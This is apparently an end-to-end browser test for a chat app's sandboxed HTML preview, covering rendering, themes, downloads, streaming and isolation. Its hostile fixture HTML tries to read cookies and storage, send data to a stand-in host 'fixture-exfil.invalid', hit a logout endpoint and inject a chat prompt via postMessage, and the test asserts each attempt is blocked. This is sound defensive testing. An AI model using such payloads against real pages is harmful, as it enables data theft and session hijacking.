import assert from 'node:assert/strict'
import { mkdir, readFile, writeFile } from 'node:fs/promises'
import { createHash } from 'node:crypto'
import { resolve } from 'node:path'
import { createServer } from 'vite'
import vue from '@vitejs/plugin-vue'
import { chromium } from 'playwright-core'

const executablePath = process.env.AGORA_BROWSER_PATH
if (!executablePath) throw new Error('Set AGORA_BROWSER_PATH to installed Chromium.')
const evidence = process.env.AGORA_EVIDENCE_DIR
if (!evidence) throw new Error('Set AGORA_EVIDENCE_DIR to a scratch evidence directory.')
await mkdir(evidence, { recursive: true })
const chart = `<!doctype html><html><head><style>
body{font-family:system-ui,sans-serif}h2{font-size:20px;margin:0 0 4px}.muted{color:var(--muted-foreground);font-size:12px}.stats{display:flex;gap:32px;margin:24px 0}.stats strong{font-size:28px;display:block}svg{display:block;width:100%;height:170px}button{background:var(--accent);color:var(--card);border:0;border-radius:6px;padding:8px 12px;cursor:pointer}.pulse{animation:pulse 2s infinite}@keyframes pulse{to{opacity:.5}}
</style></head><body><div class="muted">FICTIONAL DATA · NORTHSTAR STUDIO</div><h2>Weekly project momentum</h2><div class="muted">An interactive, self-contained HTML chart</div><div class="stats"><div><strong>42</strong><span class="muted">Tasks shipped</span></div><div><strong>+18%</strong><span class="muted">vs. last week</span></div></div><svg viewBox="0 0 600 170" role="img" aria-label="Fictional weekly throughput"><path d="M0 140H600M0 90H600M0 40H600" stroke="var(--border)"/><path d="M10 130L110 105L210 115L310 65L410 75L510 32L590 16" fill="none" stroke="var(--accent)" stroke-width="4"/><path d="M10 130L110 105L210 115L310 65L410 75L510 32L590 16V165H10Z" fill="var(--accent)" opacity=".12"/></svg><button id="details">Show summary</button><p id="summary" class="muted pulse">Select the button to explore the sample.</p><script>document.body.dataset.ready='yes';document.querySelector('#details').onclick=()=>document.querySelector('#summary').textContent='42 fictional tasks across 7 days. No network needed.';</script></body></html>`
const text = '## A chart, not another attachment\n\nHere is the fictional project summary. The chart responds without leaving the conversation.\n\n::preview{file="~/charts/momentum.html"}\n\nThe original HTML is available with **Download**.'
const messages = [{ id: 1, role: 'user', content: 'Show a fictional weekly progress chart.' }, { id: 2, role: 'assistant', content: text }]
let currentHtml = chart, missing = false
const downloads = []
const server = await createServer({ configFile: false, plugins: [vue(), {
  name: 'fictional-preview-download',
  configureServer(server) {
    server.middlewares.use((req, res, next) => {
      const url = new URL(req.url, 'http://fixture.invalid')
      if (url.pathname !== '/api/fs/download') return next()
      downloads.push(Object.fromEntries(url.searchParams))
      assert.equal(url.searchParams.get('path'), '~/charts/momentum.html')
      assert.equal(url.searchParams.get('profile'), 'work')
      res.writeHead(missing ? 404 : 200, { 'content-type': 'text/html', 'content-disposition': 'attachment; filename="momentum.html"' })
      res.end(missing ? '' : currentHtml)
    })
  },
}], server: { host: '127.0.0.1', port: 0 }, logLevel: 'error' })
let browser
const manifest = { browser: '', screenshots: [], checks: [] }
try {
  await server.listen()
  const origin = `http://127.0.0.1:${server.httpServer.address().port}`
  browser = await chromium.launch({ executablePath, headless: true })
  manifest.browser = browser.version()
  const context = await browser.newContext({ viewport: { width: 1440, height: 1100 }, colorScheme: 'light', reducedMotion: 'reduce', permissions: ['clipboard-read', 'clipboard-write'] })
  const page = await context.newPage()
  const errors = [], unexpected = [], calls = [], violations = []
  let socket
  page.on('pageerror', e => errors.push(e.message))
  page.on('console', m => { if (m.text().includes('Content Security Policy')) violations.push(m.text()) })
  await page.route('**/*', async route => {
    const url = new URL(route.request().url())
    if (url.origin !== origin) { unexpected.push(url.href); return route.abort() }
    if (!url.pathname.startsWith('/api/')) return route.continue()
    let json
    if (url.pathname === '/api/fs/download') {
      downloads.push(Object.fromEntries(url.searchParams))
      assert.equal(url.searchParams.get('path'), '~/charts/momentum.html')
      assert.equal(url.searchParams.get('profile'), 'work')
      return route.fulfill({ status: missing ? 404 : 200, contentType: 'text/html', headers: { 'content-disposition': 'attachment; filename="momentum.html"' }, body: missing ? '' : currentHtml })
    }
    if (url.pathname === '/api/agora/connection') json = { mode: 'local', endpoint: 'https://fixture.invalid' }
    else if (url.pathname === '/api/agora/push') json = { configured: false }
    else if (url.pathname === '/api/status') json = { auth_required: false }
    else if (url.pathname === '/api/sessions') json = { sessions: [{ id: 'preview', title: 'Fictional project momentum', profile: 'work' }], total: 1 }
    else if (url.pathname === '/api/sessions/preview/messages') json = { session_id: 'preview', profile: 'work', messages, pagination: { returned: 2, offset: 0, limit: 50 } }
    else { unexpected.push(url.href); return route.abort() }
    return route.fulfill({ json })
  })
  await page.routeWebSocket('**/api/ws', ws => {
    socket = ws
    ws.send(JSON.stringify({ jsonrpc: '2.0', method: 'event', params: { type: 'gateway.ready', payload: { heartbeat: false } } }))
    ws.onMessage(raw => {
      const request = JSON.parse(String(raw)); calls.push(request)
      const results = { 'session.active_list': { sessions: [] }, 'session.resume': { session_id: 'runtime-preview', stored_session_id: 'preview', info: { running: false } }, 'approval.pending': { approvals: [] }, 'subagent.list': { subagents: [] }, 'process.list': { processes: [] }, 'model.options': { providers: [] }, 'config.get': { value: 'medium' } }
      results['client.capabilities'] = {}
      assert.ok(request.method in results, `Unexpected RPC ${request.method}`)
      ws.send(JSON.stringify({ jsonrpc: '2.0', id: request.id, result: results[request.method] }))
    })
  })
  const go = async () => {
    await page.goto(origin + '/?session=preview')
    await page.waitForFunction(() => document.querySelector('.html-preview iframe'))
    const frame = page.frames().find(frame => frame.parentFrame())
    await frame.waitForSelector('body[data-ready="yes"]')
    return frame
  }
  const screenshot = async name => {
    await page.evaluate(() => document.fonts.ready)
    const path = resolve(evidence, name + '.png')
    await page.screenshot({ path })
    manifest.screenshots.push({ path, sha256: createHash('sha256').update(await readFile(path)).digest('hex'), viewport: page.viewportSize() })
  }
  let frame = await go()
  assert.equal(await page.locator('.html-preview iframe').getAttribute('sandbox'), 'allow-scripts')
  assert.equal(await page.locator('.html-preview iframe').getAttribute('src'), null)
  await frame.locator('#details').click()
  assert.match(await frame.locator('#summary').textContent(), /42 fictional/)
  assert.equal(await frame.locator('#summary').evaluate(el => getComputedStyle(el).animationName), 'none')
  await screenshot('preview-desktop-light')
  const originalFrame = await page.locator('.html-preview iframe').elementHandle()
  await page.emulateMedia({ colorScheme: 'dark' })
  await page.waitForFunction(() => getComputedStyle(document.documentElement).getPropertyValue('--text').trim() === '#e3e7f1')
  await frame.waitForFunction(() => getComputedStyle(document.documentElement).getPropertyValue('--foreground').trim() === '#e3e7f1')
  assert.equal(downloads.length, 1)
  assert.ok(await originalFrame.evaluate(el => el.isConnected))
  await screenshot('preview-desktop-dark')
  await page.getByRole('button', { name: 'Expand momentum.html', exact: true }).click()
  await page.locator('dialog[open] iframe').waitFor()
  await screenshot('preview-expanded-dark')
  await page.keyboard.press('Escape')
  await page.locator('.preview-dialog').waitFor({ state: 'detached' })
  assert.equal(await page.getByRole('button', { name: 'Expand momentum.html' }).evaluate(el => el === document.activeElement), true)
  const downloadEvent = page.waitForEvent('download')
  await page.getByRole('link', { name: 'Download momentum.html', exact: true }).click()
  const download = await downloadEvent
  assert.equal(download.suggestedFilename(), 'momentum.html')
  assert.equal(await readFile(await download.path(), 'utf8'), chart)
  assert.equal(downloads.length, 2)
  await page.setViewportSize({ width: 390, height: 844 })
  await page.emulateMedia({ colorScheme: 'light' })
  await frame.waitForFunction(() => getComputedStyle(document.documentElement).getPropertyValue('--foreground').trim() === '#252a38')
  await page.locator('.html-preview').scrollIntoViewIfNeeded()
  assert.ok(await page.locator('.html-preview').evaluate(el => el.getBoundingClientRect().right <= innerWidth))
  await screenshot('preview-mobile-light')
  await page.getByRole('button', { name: 'Expand momentum.html' }).click()
  await screenshot('preview-mobile-expanded-light')
  await page.getByRole('button', { name: 'Close preview' }).click()
  manifest.checks.push('Actual Vue desktop/mobile, light/dark live theme without reload, reduced motion, generated inline JS, expand/Escape/focus, exact downloaded original')

  const event = (type, payload) => socket.send(JSON.stringify({ jsonrpc: '2.0', method: 'event', params: { type, session_id: 'runtime-preview', payload } }))
  event('message.start', {})
  event('message.delta', { text: 'A streamed chart.\n\n::preview{file="~/charts/momentum.html"' })
  await page.getByText('A streamed chart.').waitFor()
  assert.equal(await page.locator('.html-preview iframe').count(), 1)
  assert.equal(downloads.length, 2)
  event('message.delta', { text: '}\n' })
  await page.waitForFunction(() => document.querySelectorAll('.html-preview iframe').length === 2)
  const streamed = page.locator('.html-preview iframe').last()
  await streamed.evaluate(el => { el.dataset.retained = 'yes' })

  event('message.delta', { text: '\nMore streamed **Markdown**.\n\n```html\n::preview{file="/literal.html"}\n```' })
  await page.getByText('More streamed Markdown.').waitFor()
  assert.equal(await streamed.getAttribute('data-retained'), 'yes')
  assert.equal(downloads.length, 3)
  await page.locator('.code-copy').waitFor()
  await page.locator('.code-copy').click()
  assert.equal(await page.evaluate(() => navigator.clipboard.readText()), '::preview{file="/literal.html"}\n')
  manifest.checks.push('Stored history plus real WebSocket streaming: incomplete directive remains literal, completion fetches once, later growth preserves iframe; fenced directive copies exactly')

  // Exercise hostile code inside the actual fetched Vue-owned preview.
  await page.setViewportSize({ width: 1440, height: 1100 })
  currentHtml = `<base href="https://fixture-exfil.invalid"><meta http-equiv="refresh" content="0;url=https://fixture-exfil.invalid/?secret=meta"><meta http-equiv="Content-Security-Policy" content="default-src *"><a href="/api/auth/logout" id="anchor">Unsafe link</a><form action="/api/auth/logout"><button>Submit</button></form><img src="https://fixture-exfil.invalid/static-image"><link rel="stylesheet" href="https://fixture-exfil.invalid/static-style"><iframe src="https://fixture-exfil.invalid/static-frame"></iframe><script src="https://fixture-exfil.invalid/static-script"></script><h1>Isolation fixture</h1><script>
    const proof = {}; for (const [name, run] of Object.entries({parent:()=>parent.document.body,storage:()=>localStorage.getItem('private'),cookie:()=>document.cookie,top:()=>{top.location.href='https://fixture-exfil.invalid/?secret=top'}})) { try {run();proof[name]='ALLOWED'} catch {proof[name]='denied'} }
    fetch('https://fixture-exfil.invalid/?secret=fetch').catch(()=>{});fetch('/api/auth/logout').catch(()=>{});
    const image=new Image();image.src='https://fixture-exfil.invalid/?secret=image';document.body.append(image);
    window.open('https://fixture-exfil.invalid/?secret=popup');
    parent.postMessage({type:'hermes.send',text:'Do not submit this'},'*');
    parent.postMessage({type:'agora-preview-size',height:999999},'*');
    document.body.dataset.proof=JSON.stringify(proof);document.body.dataset.ready='yes';
  </script>`
  frame = await go()
  assert.deepEqual(JSON.parse(await frame.locator('body').getAttribute('data-proof')), { parent: 'denied', storage: 'denied', cookie: 'denied', top: 'denied' })
  assert.equal(await frame.locator('#anchor').getAttribute('href'), null)
  assert.equal(await frame.locator('base,form,meta[http-equiv="refresh"]').count(), 0)
  await page.waitForFunction(() => document.querySelector('.html-preview iframe').style.height !== '320px')
  const height = await page.locator('.html-preview iframe').evaluate(el => el.getBoundingClientRect().height)
  assert.ok(height >= 160 && height <= 720)
  assert.equal(calls.some(call => ['prompt.submit', 'request.answer', 'approval.respond'].includes(call.method)), false)
  assert.equal(context.pages().length, 1)
  await page.waitForTimeout(150)
  assert.deepEqual(unexpected, [])
  manifest.checks.push('Hostile parent DOM/cookies/storage/top navigation denied; fetch/image/popups blocked; forms/base/meta/links stripped; action messages ignored; height bounded')

  // Child connect-src is not enough: inherited parent frame-src must stop self-navigation before requests.
  for (const destination of ['https://fixture-exfil.invalid/?secret=location', '/api/auth/logout?secret=location']) {
    currentHtml = `<h1>Self-navigation fixture</h1><script>document.body.dataset.ready='yes';setTimeout(()=>location.href=${JSON.stringify(destination)},300)</script>`
    await page.goto(origin + '/?session=preview')
    await page.waitForTimeout(650)
    assert.deepEqual(unexpected, [], `Self-navigation leaked a request: ${destination}`)
    assert.ok(violations.some(value => value.includes('frame-src') && value.includes(destination.startsWith('/') ? '/api/auth/logout' : 'fixture-exfil.invalid')))
    assert.equal(new URL(page.url()).pathname, '/')
  }
  manifest.checks.push('Hostile location.href to external exfil URL AND same-origin /api/auth/logout blocked by parent frame-src before route interception')

  missing = true
  await page.goto(origin + '/?session=preview')
  await page.getByRole('button', { name: 'Retry momentum.html' }).waitFor()
  await screenshot('preview-missing-file')
  currentHtml = chart; missing = false
  await page.getByRole('button', { name: 'Retry momentum.html' }).click()
  await page.frameLocator('.html-preview iframe').locator('body[data-ready="yes"]').waitFor()
  manifest.checks.push('Missing file fallback and explicit retry recovery')
  assert.deepEqual(errors, [])
  manifest.pageErrors = errors
  manifest.unexpectedNetworkRequests = unexpected
  manifest.navigationCspViolations = violations.filter(value => value.includes('frame-src'))
  manifest.sourceSha256 = createHash('sha256').update(await readFile('src/HtmlPreview.vue')).update(await readFile('src/html-preview.ts')).digest('hex')
  await writeFile(resolve(evidence, 'manifest.json'), JSON.stringify(manifest, null, 2))
  console.log(JSON.stringify(manifest, null, 2))
} finally { await browser?.close(); await server.close() }